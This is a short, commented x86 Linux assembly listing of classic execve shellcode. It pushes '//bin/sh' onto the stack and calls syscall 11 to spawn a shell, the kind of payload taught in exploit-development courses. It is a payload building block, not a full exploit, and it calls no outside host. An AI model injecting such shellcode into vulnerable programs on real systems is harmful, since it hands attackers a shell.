global _start

section .text
_start:

	;push 0x00000000 on the Stack because the end of string

	xor eax, eax
	push eax
	
	;push //bin/sh in reverse i.e. hs/nib//
	push 0x68732f6e
        push 0x69622f2f
	
	mov ebx,esp

	;push 0x00000000 on the Stack because the end of string 

	push eax
	mov edx, esp
	

	;push the address of "//bin/sh" on the stack
	
	push ebx	
	mov ecx,esp
	
	;system call
	mov al,11
	int 0x80
